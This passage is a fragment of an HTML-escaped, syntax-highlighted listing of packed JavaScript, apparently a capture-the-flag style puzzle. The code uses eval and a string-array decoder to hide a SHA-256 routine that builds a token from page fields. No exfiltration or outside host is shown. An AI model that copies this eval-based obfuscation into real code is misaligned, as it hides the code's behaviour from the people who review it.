V))&amp;lt;&amp;lt;U[i++&amp;amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&amp;gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&amp;gt;4r){k.2i+=k.L/2H&amp;lt;&amp;lt;0;k.L=k.L%2H}A\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&amp;gt;&amp;gt;2]|=2w[i&amp;amp;3];k.1C=l[16];p(i&amp;gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&amp;lt;&amp;lt;3|k.L&amp;gt;&amp;gt;&amp;gt;29;l[15]=k.L&amp;lt;&amp;lt;3;k.1W()};N.Q.1W=w(){q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&amp;lt;1k;++j){v=l[j-15];1a=((v&amp;gt;&amp;gt;&amp;gt;7)|(v&amp;lt;&amp;lt;25))^((v&amp;gt;&amp;gt;&amp;gt;18)|(v&amp;lt;&amp;lt;14))^(v&amp;gt;&amp;gt;&amp;gt;3);v=l[j-2];1b=((v&amp;gt;&amp;gt;&amp;gt;17)|(v&amp;lt;&amp;lt;15))^((v&amp;gt;&amp;gt;&amp;gt;19)|(v&amp;lt;&amp;lt;13))^(v&amp;gt;&amp;gt;&amp;gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&amp;lt;&amp;lt;0}1D=b&amp;amp;c;1g(j=0;j&amp;lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&amp;lt;&amp;lt;0;d=v+4p&amp;lt;&amp;lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&amp;lt;&amp;lt;0;d=v+4D&amp;lt;&amp;lt;0}k.2j=1O}z{1a=((a&amp;gt;&amp;gt;&amp;gt;2)|(a&amp;lt;&amp;lt;30))^((a&amp;gt;&amp;gt;&amp;gt;13)|(a&amp;lt;&amp;lt;19))^((a&amp;gt;&amp;gt;&amp;gt;22)|(a&amp;lt;&amp;lt;10));1b=((e&amp;gt;&amp;gt;&amp;gt;6)|(e&amp;lt;&amp;lt;26))^((e&amp;gt;&amp;gt;&amp;gt;11)|(e&amp;lt;&amp;lt;21))^((e&amp;gt;&amp;gt;&amp;gt;25)|(e&amp;lt;&amp;lt;7));1B=a&amp;amp;b;1j=1B^(a&amp;amp;c)^1D;1h=(e&amp;amp;f)^(~e&amp;amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&amp;lt;&amp;lt;0;d=v+1f&amp;lt;&amp;lt;0}1a=((d&amp;gt;&amp;gt;&amp;gt;2)|(d&amp;lt;&amp;lt;30))^((d&amp;gt;&amp;gt;&amp;gt;13)|(d&amp;lt;&amp;lt;19))^((d&amp;gt;&amp;gt;&amp;gt;22)|(d&amp;lt;&amp;lt;10));1b=((h&amp;gt;&amp;gt;&amp;gt;6)|(h&amp;lt;&amp;lt;26))^((h&amp;gt;&amp;gt;&amp;gt;11)|(h&amp;lt;&amp;lt;21))^((h&amp;gt;&amp;gt;&amp;gt;25)|(h&amp;lt;&amp;lt;7));1Z=d&amp;amp;a;1j=1Z^(d&amp;amp;b)^1B;1h=(h&amp;amp;e)^(~h&amp;amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&amp;lt;&amp;lt;0;c=v+1f&amp;lt;&amp;lt;0;1a=((c&amp;gt;&amp;gt;&amp;gt;2)|(c&amp;lt;&amp;lt;30))^((c&amp;gt;&amp;gt;&amp;gt;13)|(c&amp;lt;&amp;lt;19))^((c&amp;gt;&amp;gt;&amp;gt;22)|(c&amp;lt;&amp;lt;10));1b=((g&amp;gt;&amp;gt;&amp;gt;6)|(g&amp;lt;&amp;lt;26))^((g&amp;gt;&amp;gt;&amp;gt;11)|(g&amp;lt;&amp;lt;21))^((g&amp;gt;&amp;gt;&amp;gt;25)|(g&amp;lt;&amp;lt;7));1V=c&amp;amp;d;1j=1V^(c&amp;amp;a)^1Z;1h=(g&amp;amp;h)^(~g&amp;amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&amp;lt;&amp;lt;0;b=v+1f&amp;lt;&amp;lt;0;1a=((b&amp;gt;&amp;gt;&amp;gt;2)|(b&amp;lt;&amp;lt;30))^((b&amp;gt;&amp;gt;&amp;gt;13)|(b&amp;lt;&amp;lt;19))^((b&amp;gt;&amp;gt;&amp;gt;22)|(b&amp;lt;&amp;lt;10));1b=((f&amp;gt;&amp;gt;&amp;gt;6)|(f&amp;lt;&amp;lt;26))^((f&amp;gt;&amp;gt;&amp;gt;11)|(f&amp;lt;&amp;lt;21))^((f&amp;gt;&amp;gt;&amp;gt;25)|(f&amp;lt;&amp;lt;7));1D=b&amp;amp;c;1j=1D^(b&amp;amp;d)^1V;1h=(f&amp;amp;g)^(~f&amp;amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&amp;lt;&amp;lt;0;a=v+1f&amp;lt;&amp;lt;0}k.C=k.C+a&amp;lt;&amp;lt;0;k.B=k.B+b&amp;lt;&amp;lt;0;k.E=k.E+c&amp;lt;&amp;lt;0;k.F=k.F+d&amp;lt;&amp;lt;0;k.J=k.J+e&amp;lt;&amp;lt;0;k.I=k.I+f&amp;lt;&amp;lt;0;k.H=k.H+g&amp;lt;&amp;lt;0;k.D=k.D+h&amp;lt;&amp;lt;0};N.Q.1e=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C&amp;gt;&amp;gt;28)&amp;amp;o]+m[(C&amp;gt;&amp;gt;24)&amp;amp;o]+m[(C&amp;gt;&amp;gt;20)&amp;amp;o]+m[(C&amp;gt;&amp;gt;16)&amp;amp;o]+m[(C&amp;gt;&amp;gt;12)&amp;amp;o]+m[(C&amp;gt;&amp;gt;8)&amp;amp;o]+m[(C&amp;gt;&amp;gt;4)&amp;amp;o]+m[C&amp;amp;o]+m[(B&amp;gt;&amp;gt;28)&amp;amp;o]+m[(B&amp;gt;&amp;gt;24)&amp;amp;o]+m[(B&amp;gt;&amp;gt;20)&amp;amp;o]+m[(B&amp;gt;&amp;gt;16)&amp;amp;o]+m[(B&amp;gt;&amp;gt;12)&amp;amp;o]+m[(B&amp;gt;&amp;gt;8)&amp;amp;o]+m[(B&amp;gt;&amp;gt;4)&amp;amp;o]+m[B&amp;amp;o]+m[(E&amp;gt;&amp;gt;28)&amp;amp;o]+m[(E&amp;gt;&amp;gt;24)&amp;amp;o]+m[(E&amp;gt;&amp;gt;20)&amp;amp;o]+m[(E&amp;gt;&amp;gt;16)&amp;amp;o]+m[(E&amp;gt;&amp;gt;12)&amp;amp;o]+m[(E&amp;gt;&amp;gt;8)&amp;amp;o]+m[(E&amp;gt;&amp;gt;4)&amp;amp;o]+m[E&amp;amp;o]+m[(F&amp;gt;&amp;gt;28)&amp;amp;o]+m[(F&amp;gt;&amp;gt;24)&amp;amp;o]+m[(F&amp;gt;&amp;gt;20)&amp;amp;o]+m[(F&amp;gt;&amp;gt;16)&amp;amp;o]+m[(F&amp;gt;&amp;gt;12)&amp;amp;o]+m[(F&amp;gt;&amp;gt;8)&amp;amp;o]+m[(F&amp;gt;&amp;gt;4)&amp;amp;o]+m[F&amp;amp;o]+m[(J&amp;gt;&amp;gt;28)&amp;amp;o]+m[(J&amp;gt;&amp;gt;24)&amp;amp;o]+m[(J&amp;gt;&amp;gt;20)&amp;amp;o]+m[(J&amp;gt;&amp;gt;16)&amp;amp;o]+m[(J&amp;gt;&amp;gt;12)&amp;amp;o]+m[(J&amp;gt;&amp;gt;8)&amp;amp;o]+m[(J&amp;gt;&amp;gt;4)&amp;amp;o]+m[J&amp;amp;o]+m[(I&amp;gt;&amp;gt;28)&amp;amp;o]+m[(I&amp;gt;&amp;gt;24)&amp;amp;o]+m[(I&amp;gt;&amp;gt;20)&amp;amp;o]+m[(I&amp;gt;&amp;gt;16)&amp;amp;o]+m[(I&amp;gt;&amp;gt;12)&amp;amp;o]+m[(I&amp;gt;&amp;gt;8)&amp;amp;o]+m[(I&amp;gt;&amp;gt;4)&amp;amp;o]+m[I&amp;amp;o]+m[(H&amp;gt;&amp;gt;28)&amp;amp;o]+m[(H&amp;gt;&amp;gt;24)&amp;amp;o]+m[(H&amp;gt;&amp;gt;20)&amp;amp;o]+m[(H&amp;gt;&amp;gt;16)&amp;amp;o]+m[(H&amp;gt;&amp;gt;12)&amp;amp;o]+m[(H&amp;gt;&amp;gt;8)&amp;amp;o]+m[(H&amp;gt;&amp;gt;4)&amp;amp;o]+m[H&amp;amp;o];p(!k.x){1e+=m[(D&amp;gt;&amp;gt;28)&amp;amp;o]+m[(D&amp;gt;&amp;gt;24)&amp;amp;o]+m[(D&amp;gt;&amp;gt;20)&amp;amp;o]+m[(D&amp;gt;&amp;gt;16)&amp;amp;o]+m[(D&amp;gt;&amp;gt;12)&amp;amp;o]+m[(D&amp;gt;&amp;gt;8)&amp;amp;o]+m[(D&amp;gt;&amp;gt;4)&amp;amp;o]+m[D&amp;amp;o]}A\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C&amp;gt;&amp;gt;24)&amp;amp;u,(C&amp;gt;&amp;gt;16)&amp;amp;u,(C&amp;gt;&amp;gt;8)&amp;amp;u,C&amp;amp;u,(B&amp;gt;&amp;gt;24)&amp;amp;u,(B&amp;gt;&amp;gt;16)&amp;amp;u,(B&amp;gt;&amp;gt;8)&amp;amp;u,B&amp;amp;u,(E&amp;gt;&amp;gt;24)&amp;amp;u,(E&amp;gt;&amp;gt;16)&amp;amp;u,(E&amp;gt;&amp;gt;8)&amp;amp;u,E&amp;amp;u,(F&amp;gt;&amp;gt;24)&amp;amp;u,(F&amp;gt;&amp;gt;16)&amp;amp;u,(F&amp;gt;&amp;gt;8)&amp;amp;u,F&amp;amp;u,(J&amp;gt;&amp;gt;24)&amp;amp;u,(J&amp;gt;&amp;gt;16)&amp;amp;u,(J&amp;gt;&amp;gt;8)&amp;amp;u,J&amp;amp;u,(I&amp;gt;&amp;gt;24)&amp;amp;u,(I&amp;gt;&amp;gt;16)&amp;amp;u,(I&amp;gt;&amp;gt;8)&amp;amp;u,I&amp;amp;u,(H&amp;gt;&amp;gt;24)&amp;amp;u,(H&amp;gt;&amp;gt;16)&amp;amp;u,(H&amp;gt;&amp;gt;8)&amp;amp;u,H&amp;amp;u];p(!k.x){2b.4A((D&amp;gt;&amp;gt;24)&amp;amp;u,(D&amp;gt;&amp;gt;16)&amp;amp;u,(D&amp;gt;&amp;gt;8)&amp;amp;u,D&amp;amp;u)}A\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\x201w};w\x201P(G,x,1v){q\x20i,T=1c\x20G;p(T===\x272p\x27){q\x20L=[],W=G.W,M=0,r;1g(i=0;i&amp;lt;W;++i){r=G.1Q(i);p(r&amp;lt;R){L[M++]=r}z\x20p(r&amp;lt;2v){L[M++]=(2t|(r&amp;gt;&amp;gt;6));L[M++]=(R|(r&amp;amp;V))}z\x20p(r&amp;lt;2A||r&amp;gt;=2E){L[M++]=(2D|(r&amp;gt;&amp;gt;12));L[M++]=(R|((r&amp;gt;&amp;gt;6)&amp;amp;V));L[M++]=(R|(r&amp;amp;V))}z{r=2C+(((r&amp;amp;23)&amp;lt;&amp;lt;10)|(G.1Q(++i)&amp;amp;23));L[M++]=(2X|(r&amp;gt;&amp;gt;18));L[M++]=(R|((r&amp;gt;&amp;gt;12)&amp;amp;V));L[M++]=(R|((r&amp;gt;&amp;gt;6)&amp;amp;V));L[M++]=(R|(r&amp;amp;V))}}G=L}z{p(T===\x271n\x27){p(G===2q){1u\x20O\x201t(1l)}z\x20p(1y&amp;amp;&amp;amp;G.1J===Z){G=O\x202r(G)}z\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}}p(G.W&amp;gt;1k){G=(O\x20N(x,1d)).S(G).27()}q\x201F=[],2e=[];1g(i=0;i&amp;lt;1k;++i){q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\x20X})}}})();w\x202y(e){1g(q\x20t=\x22\x22,n=e.W-1;n&amp;gt;=0;n--)t+=e[n];A\x20t}w\x202J(t,y=\x224B\x22){1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)}w\x202B(e=\x224E\x22){1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)}w\x202K(a,b){1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)}1m.1o(\x222F\x22).1r=\x22\x22;4u(w(){2B(\x224M\x22)},4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;split&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">d&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;push&amp;#39;&lt;/span>&lt;span class="p">](&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;shift&amp;#39;&lt;/span>&lt;span class="p">]());&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="nx">e&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}(&lt;/span>&lt;span class="nx">a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1f4&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">d&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mh">0x0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">e&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">f&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">g&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">h&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nx">e&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nx">h&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">parseInt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">)))&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">j&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mh">0x23&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="nb">String&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x0&amp;#39;&lt;/span>&lt;span class="p">)](&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x1d&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="nx">j&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x1&amp;#39;&lt;/span>&lt;span class="p">)](&lt;/span>&lt;span class="mh">0x24&lt;/span>&lt;span class="p">));&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x2&amp;#39;&lt;/span>&lt;span class="p">)](&lt;/span>&lt;span class="sr">/^/&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">String&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">i&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">g&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">h&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">g&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;wpA&amp;#39;&lt;/span> &lt;span class="o">!==&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x3&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">i&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">)]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">g&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="nx">k&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">g&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">];&lt;/span>
&lt;span class="nx">k&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x4&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">;&lt;/span>
&lt;span class="nx">f&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">];&lt;/span>
&lt;span class="nx">h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x4&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">;&lt;/span>
&lt;span class="nx">f&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">;&lt;/span>&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="o">--&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x5&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x6&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">];&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">d&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">d&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;0x2&amp;#39;&lt;/span>&lt;span class="p">)](&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nb">RegExp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;\x5cb&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">h&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;\x5cb&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;g&amp;#39;&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">g&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">f&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
